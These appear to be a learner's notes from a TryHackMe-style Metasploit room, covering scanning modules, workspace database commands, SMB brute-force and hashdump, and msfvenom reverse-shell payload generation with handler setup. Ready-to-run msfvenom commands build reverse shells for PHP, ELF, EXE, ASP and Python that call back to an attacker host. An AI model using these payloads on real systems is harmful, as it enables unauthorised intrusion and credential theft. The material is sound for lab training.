-  [[Metasploit]] has modules that can be used to scan open ports on a target machine: `search portscan`
- You can use `nmap` from the `msfconsole` as well.
- `scanner/discovery/udp_sweep` (`/usr/share/metasploit-framework/modules/auxiliary/scanner/discovery/udp_sweep`) - for [[UDP (User Datagram Protocol)]] scans.
-  [[SMB (Server Message Block)]] scanners:
	-  `/usr/share/metasploit-framework/modules/auxiliary/scanner/smb/`
- "When performing service scans, it would be important not to omit more "exotic" services such as NetBIOS."
- [[SMB (Server Message Block)]]:
	- login brute force module: `/usr/share/metasploit-framework/modules/auxiliary/smb/smb_login` 
	- version: `/usr/share/metasploit-framework/modules/auxiliary/smb/smb_version`
- [[HTTP (Hypertext Transfer Protocol)]] version: `/usr/share/metasploit-framework/modules/auxiliary/http/http_version`
-  NetBIOS: 
	-  info: `auxiliary/scanner/netbios/nbname`

###### The Metasploit Database
- purpose: to simplify project management and avoid possible confusion when setting up parameters values.
- Start the PostgreSQL database: `systemctl start postgresql`
- Initialize the [[Metasploit]] Database: `msfdb init`
- list all the current workspaces: `workspace`
	-  `workspace -a tryhackme`: add a new workspace named `tryhackme`
	-  `workspace -d tryhackme`: remove a workspace named `tryhackme`
	-  move between workspaces by simply using `workspace <name_of_workspace>`
	- `workspace -h`
- you can use the command `help`, if [[Metasploit]] is launched with a database, additional commands will be displayed related to the [[Metasploit]] Database.
- `dn_nmap` will save the scan results into the database ([[nmap (network mapper)]] crossover)
	-  example: `db_nmap -sV -p- 10.10.89.52`
	-  you can use `hosts` and `services` after the scan.
		-  `hosts -h`
		-  `services -h`
		-  `services -S <service>` - search for a specific service, example `services -S netbios`
		-  `hosts -R` to add the this value to the `RHOSTS` parameter.

###### Vulnerability Scanning
- "[[Metasploit]] allows you to quickly identify some critical vulnerabilities that could be considered as “low hanging fruit”.  The term “low hanging fruit” usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as root or administrator."
- `info`
- `sessions`, `sessions -i <session_number>`

###### Exploitation
- `hashdump` - dump all the hashes from the `sam` (`C:/Windows/System32/`) database in a windows system. (available when using Meterpreter)

###### Msfvenom
- replaced `Msfpayload` and `Msfencode`
- will allow you to access all payloads available in the [[Metasploit]] framework. ([[cybersec/thm/PHP]], exe, dll, elf, etc.)
- `msfvenom -l payloads`

Output formats
- `msfvenom --list format`

Encoders
- "Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. While it can be effective against some antivirus software"
- "..., using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem."
- example: `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`

Handlers
- used for catching Reverse Shells, to accept incoming connections generated by the MSFvenom payload.
- `msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php`
- don't forget to remove the "comments" in the payload. The reverse_shell.php file should be edited to convert it into a working PHP file. Add end tag.

- Generate the [[cybersec/thm/PHP]] shell using MSFvenom
- Start the [[Metasploit]] handler
- Execute the [[cybersec/thm/PHP]] shell

- "Multi handler supports all [[Metasploit]] payloads and can be used for Meterpreter as well as regular shells."
- `use exploit/multi/handler`, set the payload value to: `php/reverse_php`

###### Other Payloads
- Linux Executable and Linkable Format (elf): `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
- The .elf format is comparable to the .exe format in Windows.
- make sure they have executable permissions on the target machine. (`chmod +x shell.elf`). Execute it with `./shell.elf`

- Windows: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`

- [[cybersec/thm/PHP]]: `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`

- ASP: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`

- Python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

- "All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload."

- `uname -m` - system architecture
- MAKE SURE TO SET THE PAYLOAD PARAMETER! SYSTEM ARCHITECTURE, LHOST AND LPORT SHOULD MATCH!
- in a meterpreter session: `run post/multi/recon/local_exploit_suggester`